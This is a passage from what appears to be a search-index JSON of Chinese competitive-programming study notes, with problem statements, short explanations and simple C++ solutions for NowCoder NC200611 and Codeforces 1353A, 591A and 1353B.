Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#16-sample-output","text":"All First No First First","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#17-source","text":"\u725b\u5ba2\u7f51 NC200611 F-\u53c2\u8d5b","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#18-notes","text":"11\u53ef\u4ee5\u5206\u4e3a \u4e00\u652f\u5929\u68af\u8d5b\u7684\u961f\u4f0d\u548c\u4e00\u4e2a\u6559\u7ec3 \u6216\u8005 \u4e09\u652ficpc\u7684\u961f\u4f0d\u548c\u4e24\u4e2a\u6559\u7ec3\uff0c\u6240\u4ee5\u8f93\u51fa All \u3002 7\u53ea\u80fd\u5206\u4e3a \u4e24\u652ficpc\u7684\u961f\u4f0d\u548c\u4e00\u4e2a\u6559\u7ec3\uff0c\u6240\u4ee5\u8f93\u51fa First \u3002","title":"1.8. Notes"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#2","text":"\u5982\u679c 0 < n \\% 10 \\le \\lfloor n / 10\\rfloor \uff0c\u53ef\u4ee5\u53c2\u52a0\u5929\u68af\u8d5b\uff0c\u5982\u679c 0 < n \\% 10 \\le \\lfloor n / 10\\rfloor \uff0c\u53ef\u4ee5\u53c2\u52a0icpc\u3002 \u8fd8\u6709\u4e00\u79cd\u60c5\u51b5\u662f n \\% 10 == 0 \u4e14 \\lfloor (n - 1) / 10\\rfloor \\ge 10 \uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u4ee5\u7ed3\u5408\u4e0a\u4e00\u6761\u89c4\u5219\uff0c\u7b80\u5316\u4e3a n >= 110 \uff0c\u53ef\u4ee5\u53c2\u52a0\u5929\u68af\u8d5b \u5bf9 3 \u4e5f\u662f\u7c7b\u4f3c\u7684\uff0c n \\ge 12 \uff0c\u53ef\u4ee5\u53c2\u52a0icpc\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200611_F-%E5%8F%82%E8%B5%9B/#3","text":"#include <algorithm> #include <iostream> #include <math.h> const long long num = 1e6 + 1; using namespace std; long long list[num]; int main() { long long n, m; string ans; long long sum = 0; long long num10, buffer10; long long num3, buffer3; bool mark10, mark3; // \u8ba1\u7b97 while (scanf(\"%lld\", &n) != EOF) { num10 = floor(n / 10); num3 = floor(n / 3); buffer10 = n % 10; buffer3 = n % 3; if ((buffer10 <= num10 && buffer10 > 0) || n >= 110) { mark10 = true; } else { mark10 = false; } if ((buffer3 <= num3 && buffer3 > 0) || n >= 12) { mark3 = true; } else { mark3 = false; } if (mark10 && mark3) { ans = \"All\"; } else if (mark10) { ans = \"Second\"; } else if (mark3) { ans = \"First\"; } else { ans = \"No\"; } printf(\"%s\\n\", ans.c_str()); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/","text":"CodeForces 1353 A. Most Unstable Array # \u76ee\u5f55 # CodeForces 1353 A. Most Unstable Array \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 256 MB 1.2. Problem Description # You are given two integers n and m . You have to construct the array a of length n consisting of non-negative integers (i.e. integers greater than or equal to zero) such that the sum of elements of this array is exactly m and the value \\displaystyle \\sum_{i = 1}^{n-1}|a_i - a_{i+1}| is the maximum possible. Recall that |x| is the absolute value of x . n other words, you have to maximize the sum of absolute differences between adjacent (consecutive) elements. For example, if the array a=[1,3,2,5,5,0] then the value above for this array is |1\u22123|+|3\u22122|+|2\u22125|+|5\u22125|+|5\u22120|=2+1+3+0+5=11 . Note that this example doesn't show the optimal answer but it shows how the required value for some array is calculated. You have to answer t independent test cases. 1.3. Input # The first line of the input contains one integer t(1 \\le t \\le 10^4) \u2014 the number of test cases. Then t test cases follow. The only line of the test case contains two integers n and m (1 \\le n,m\\le 10^9) \u2014 the length of the array and its sum correspondingly. 1.4. Output # For each test case, print the answer \u2014 the maximum possible value of \\displaystyle \\sum_{i = 1}^{n-1}|a_i - a_{i+1}| for the array a consisting of n non-negative integers with the sum m . 1.5. Sample Input # 5 1 100 2 2 5 5 2 1000000000 1000000000 1000000000 1.6. Sample Output # 0 2 10 1000000000 2000000000 1.7. Notes # n the first test case of the example, the only possible array is [100] and the answer is obviously 0. In the second test case of the example, one of the possible arrays is [2,0] and the answer is |2\u22120|=2 . In the third test case of the example, one of the possible arrays is [0,2,0,3,0] and the answer is |0\u22122|+|2\u22120|+|0\u22123|+|3\u22120|=10 . 1.8. Source # CodeForces 1353 A. Most Unstable Array 2. \u89e3\u8bfb # \u627e\u89c4\u5f8b\u3002 n = 1 \u65f6\uff0c\u8f93\u51fa 0 \u3002 n = 2 \u65f6\uff0c\u8f93\u51fa m \u3002 n > 2 \u65f6\uff0c\u8f93\u51fa \\displaystyle 2 \\times m \u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> const long long num = 1e2 + 1; using namespace std; long long list[num]; int main() { // test case long long t; long long n, m; long long ans = 0; // test case scanf(\"%lld\", &t); // \u8f93\u5165 while (t--) { scanf(\"%lld %lld\", &n, &m); if (n == 1) { ans = 0; } else if (n == 2) { ans = m; } else { ans = 2 * m; } // \u8f93\u51fa printf(\"%lld\\n\", ans); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"8.CodeForces 1353 A Most Unstable Array"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#codeforces-1353-a-most-unstable-array","text":"","title":"CodeForces 1353 A. Most Unstable Array"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#_1","text":"CodeForces 1353 A. Most Unstable Array \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 256 MB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#12-problem-description","text":"You are given two integers n and m . You have to construct the array a of length n consisting of non-negative integers (i.e. integers greater than or equal to zero) such that the sum of elements of this array is exactly m and the value \\displaystyle \\sum_{i = 1}^{n-1}|a_i - a_{i+1}| is the maximum possible. Recall that |x| is the absolute value of x . n other words, you have to maximize the sum of absolute differences between adjacent (consecutive) elements. For example, if the array a=[1,3,2,5,5,0] then the value above for this array is |1\u22123|+|3\u22122|+|2\u22125|+|5\u22125|+|5\u22120|=2+1+3+0+5=11 . Note that this example doesn't show the optimal answer but it shows how the required value for some array is calculated. You have to answer t independent test cases.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#13-input","text":"The first line of the input contains one integer t(1 \\le t \\le 10^4) \u2014 the number of test cases. Then t test cases follow. The only line of the test case contains two integers n and m (1 \\le n,m\\le 10^9) \u2014 the length of the array and its sum correspondingly.","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#14-output","text":"For each test case, print the answer \u2014 the maximum possible value of \\displaystyle \\sum_{i = 1}^{n-1}|a_i - a_{i+1}| for the array a consisting of n non-negative integers with the sum m .","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#15-sample-input","text":"5 1 100 2 2 5 5 2 1000000000 1000000000 1000000000","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#16-sample-output","text":"0 2 10 1000000000 2000000000","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#17-notes","text":"n the first test case of the example, the only possible array is [100] and the answer is obviously 0. In the second test case of the example, one of the possible arrays is [2,0] and the answer is |2\u22120|=2 . In the third test case of the example, one of the possible arrays is [0,2,0,3,0] and the answer is |0\u22122|+|2\u22120|+|0\u22123|+|3\u22120|=10 .","title":"1.7. Notes"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#18-source","text":"CodeForces 1353 A. Most Unstable Array","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#2","text":"\u627e\u89c4\u5f8b\u3002 n = 1 \u65f6\uff0c\u8f93\u51fa 0 \u3002 n = 2 \u65f6\uff0c\u8f93\u51fa m \u3002 n > 2 \u65f6\uff0c\u8f93\u51fa \\displaystyle 2 \\times m \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/8.CodeForces_1353_A_Most_Unstable_Array/#3","text":"#include <algorithm> #include <iostream> const long long num = 1e2 + 1; using namespace std; long long list[num]; int main() { // test case long long t; long long n, m; long long ans = 0; // test case scanf(\"%lld\", &t); // \u8f93\u5165 while (t--) { scanf(\"%lld %lld\", &n, &m); if (n == 1) { ans = 0; } else if (n == 2) { ans = m; } else { ans = 2 * m; } // \u8f93\u51fa printf(\"%lld\\n\", ans); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/","text":"CodeForces 591 A. Wizards' Duel # \u76ee\u5f55 # CodeForces 591 A. Wizards' Duel \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2 seconds Memory Limit: 256 MB 1.2. Problem Description # Harry Potter and He-Who-Must-Not-Be-Named engaged in a fight to the death once again. This time they are located at opposite ends of the corridor of length l . Two opponents simultaneously charge a deadly spell in the enemy. We know that the impulse of Harry's magic spell flies at a speed of p meters per second, and the impulse of You-Know-Who's magic spell flies at a speed of q meters per second. The impulses are moving through the corridor toward each other, and at the time of the collision they turn round and fly back to those who cast them without changing their original speeds. Then, as soon as the impulse gets back to it's caster, the wizard reflects it and sends again towards the enemy, without changing the original speed of the impulse. Since Harry has perfectly mastered the basics of magic, he knows that after the second collision both impulses will disappear, and a powerful explosion will occur exactly in the place of their collision. However, the young wizard isn't good at math, so he asks you to calculate the distance from his position to the place of the second meeting of the spell impulses, provided that the opponents do not change positions during the whole fight. 1.3. Input # The first line of the input contains a single integer l ( 1\u2009\u2264\u2009l\u2009\u2264\u20091\u2009000 ) \u2014 the length of the corridor where the fight takes place. The second line contains integer p , the third line contains integer q ( 1\u2009\u2264\u2009p,\u2009q\u2009\u2264\u2009500 ) \u2014 the speeds of magical impulses for Harry Potter and He-Who-Must-Not-Be-Named, respectively. 1.4. Output # Print a single real number \u2014 the distance from the end of the corridor, where Harry is located, to the place of the second meeting of the spell impulses. Your answer will be considered correct if its absolute or relative error will not exceed 10^{-4} . Namely: let's assume that your answer equals a , and the answer of the jury is b . The checker program will consider your answer correct if \\frac{|a - b|}{\\max(1, b)} \\le 10^{-4} . 1.5. Sample Input # 100 1.6. Sample Output # 50 1.7. Note # In the first sample the speeds of the impulses are equal, so both of their meetings occur exactly in the middle of the corridor. 1.8. Source # CodeForces 591 A. Wizards' Duel 2. \u89e3\u8bfb # A \u548c B \u8ddd\u79bb l \u7c73\uff0c\u5c0f\u7403 k_1 \u4ece A \u51fa\u53d1\u4ee5\u901f\u5ea6 p \u5411 B \u8fd0\u52a8\uff0c k_2 \u4ece B \u51fa\u53d1\u4ee5\u901f\u5ea6 q \u5411 A \u8fd0\u52a8\uff0c\u4e24\u5c0f\u7403\u76f8\u649e\u540e\u4ee5\u539f\u6709\u901f\u5ea6\u5f80\u53cd\u65b9\u5411\u8fd0\u52a8\uff0c\u56de\u5230\u51fa\u53d1\u70b9\u540e\u518d\u4ee5\u539f\u6709\u901f\u5ea6\u5f80\u53cd\u65b9\u5411\u8fd0\u52a8\u3002\u6c42\u4e24\u5c0f\u7403\u7b2c\u4e8c\u6b21\u76f8\u649e\u7684\u5730\u70b9\u5230 A \u7684\u8ddd\u79bb\u3002 \u6c42\u7b2c\u4e00\u6b21\u76f8\u649e\u5730\u70b9\u5373\u53ef\uff0c\u7ed3\u679c\u4e3a \\frac{l}{(p + q)} \\times q \u4fdd\u7559 4 \u4f4d\u5c0f\u6570\u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; int main() { double l, p, q; scanf(\"%lf %lf %lf\", &l, &p, &q); double ans = l / (p + q) * p; printf(\"%.4lf\", ans); return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"9.CodeForces 591 A Wizards Duel"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#codeforces-591-a-wizards-duel","text":"","title":"CodeForces 591 A. Wizards' Duel"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#_1","text":"CodeForces 591 A. Wizards' Duel \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#11-limit","text":"Time Limit: 2 seconds Memory Limit: 256 MB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#12-problem-description","text":"Harry Potter and He-Who-Must-Not-Be-Named engaged in a fight to the death once again. This time they are located at opposite ends of the corridor of length l . Two opponents simultaneously charge a deadly spell in the enemy. We know that the impulse of Harry's magic spell flies at a speed of p meters per second, and the impulse of You-Know-Who's magic spell flies at a speed of q meters per second. The impulses are moving through the corridor toward each other, and at the time of the collision they turn round and fly back to those who cast them without changing their original speeds. Then, as soon as the impulse gets back to it's caster, the wizard reflects it and sends again towards the enemy, without changing the original speed of the impulse. Since Harry has perfectly mastered the basics of magic, he knows that after the second collision both impulses will disappear, and a powerful explosion will occur exactly in the place of their collision. However, the young wizard isn't good at math, so he asks you to calculate the distance from his position to the place of the second meeting of the spell impulses, provided that the opponents do not change positions during the whole fight.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#13-input","text":"The first line of the input contains a single integer l ( 1\u2009\u2264\u2009l\u2009\u2264\u20091\u2009000 ) \u2014 the length of the corridor where the fight takes place. The second line contains integer p , the third line contains integer q ( 1\u2009\u2264\u2009p,\u2009q\u2009\u2264\u2009500 ) \u2014 the speeds of magical impulses for Harry Potter and He-Who-Must-Not-Be-Named, respectively.","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#14-output","text":"Print a single real number \u2014 the distance from the end of the corridor, where Harry is located, to the place of the second meeting of the spell impulses. Your answer will be considered correct if its absolute or relative error will not exceed 10^{-4} . Namely: let's assume that your answer equals a , and the answer of the jury is b . The checker program will consider your answer correct if \\frac{|a - b|}{\\max(1, b)} \\le 10^{-4} .","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#15-sample-input","text":"100","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#16-sample-output","text":"50","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#17-note","text":"In the first sample the speeds of the impulses are equal, so both of their meetings occur exactly in the middle of the corridor.","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#18-source","text":"CodeForces 591 A. Wizards' Duel","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#2","text":"A \u548c B \u8ddd\u79bb l \u7c73\uff0c\u5c0f\u7403 k_1 \u4ece A \u51fa\u53d1\u4ee5\u901f\u5ea6 p \u5411 B \u8fd0\u52a8\uff0c k_2 \u4ece B \u51fa\u53d1\u4ee5\u901f\u5ea6 q \u5411 A \u8fd0\u52a8\uff0c\u4e24\u5c0f\u7403\u76f8\u649e\u540e\u4ee5\u539f\u6709\u901f\u5ea6\u5f80\u53cd\u65b9\u5411\u8fd0\u52a8\uff0c\u56de\u5230\u51fa\u53d1\u70b9\u540e\u518d\u4ee5\u539f\u6709\u901f\u5ea6\u5f80\u53cd\u65b9\u5411\u8fd0\u52a8\u3002\u6c42\u4e24\u5c0f\u7403\u7b2c\u4e8c\u6b21\u76f8\u649e\u7684\u5730\u70b9\u5230 A \u7684\u8ddd\u79bb\u3002 \u6c42\u7b2c\u4e00\u6b21\u76f8\u649e\u5730\u70b9\u5373\u53ef\uff0c\u7ed3\u679c\u4e3a \\frac{l}{(p + q)} \\times q \u4fdd\u7559 4 \u4f4d\u5c0f\u6570\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/9.CodeForces_591_A_Wizards_Duel/#3","text":"#include <iostream> using namespace std; int main() { double l, p, q; scanf(\"%lf %lf %lf\", &l, &p, &q); double ans = l / (p + q) * p; printf(\"%.4lf\", ans); return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/","text":"CodeForces 1353 B. Two Arrays And Swaps # \u76ee\u5f55 # CodeForces 1353 B. Two Arrays And Swaps \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Onput 1.5. Sample Input 1.6. Sample Onput 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1 second Memory Limit: 256 megabytes 1.2. Problem Description # You are given two arrays a and b both consisting of n positive (greater than zero) integers. You are also given an integer k . In one move, you can choose two indices i and j ( 1 \\le i, j \\le n ) and swap a_i and b_j (i.e. a_i becomes b_j and vice versa). Note that i and j can be equal or different (in particular, swap a_2 with b_2 or swap a_3 and b_9 both are acceptable moves). Your task is to find the maximum possible sum you can obtain in the array a if you can do no more than (i.e. at most) k such moves (swaps). You have to answer t independent test cases. 1.3. Input # The first line of the input contains one integer t ( 1 \\le t \\le 200 ) \u2014 the number of test cases. Then t test cases follow. The first line of the test case contains two integers n and k ( 1 \\le n \\le 30; 0 \\le k \\le n ) \u2014 the number of elements in a and b and the maximum number of moves you can do. The second line of the test case contains n integers a_1, a_2, \\dots, a_n ( 1 \\le a_i \\le 30 ), where a_i is the i -th element of a . The third line of the test case contains n integers b_1, b_2, \\dots, b_n ( 1 \\le b_i \\le 30 ), where b_i is the i -th element of b . 1.4. Onput # For each test case, print the answer \u2014 the maximum possible sum you can obtain in the array a if you can do no more than (i.e. at most) k swaps. 1.5. Sample Input # 5 2 1 1 2 3 4 5 5 5 5 6 6 5 1 2 5 4 3 5 3 1 2 3 4 5 10 9 10 10 9 4 0 2 2 4 3 2 4 2 3 4 4 1 2 2 1 4 4 5 4 1.6. Sample Onput # 6 27 39 11 17 1.7. Note # In the first test case of the example, you can swap a_1 = 1 and b_2 = 4 , so a=[4, 2] and b=[3, 1] . In the second test case of the example, you don't need to swap anything. In the third test case of the example, you can swap a_1 = 1 and b_1 = 10 , a_3 = 3 and b_3 = 10 and a_2 = 2 and b_4 = 10 , so a=[10, 10, 10, 4, 5] and b=[1, 9, 3, 2, 9] . In the fourth test case of the example, you cannot swap anything. In the fifth test case of the example, you can swap arrays a and b , so a=[4, 4, 5, 4] and b=[1, 2, 2, 1] . 1.8. Source # CodeForces 1353 B. Two Arrays And Swaps 2. \u89e3\u8bfb # \u5c06 a \u5e8f\u5217\u6309\u7167\u5347\u5e8f\u6392\u5e8f\uff0c \u5c06 b \u6309\u7167\u964d\u5e8f\u6392\u5e8f\u3002 \u4f9d\u6b21\u904d\u5386 a \u5e8f\u5217\u4e2d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5f53 a_i > b_j \u65f6\uff0c\u5c06 a_i \u548c b_j \u4ea4\u6362\uff0c\u7136\u540e j = j + 1 \u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include 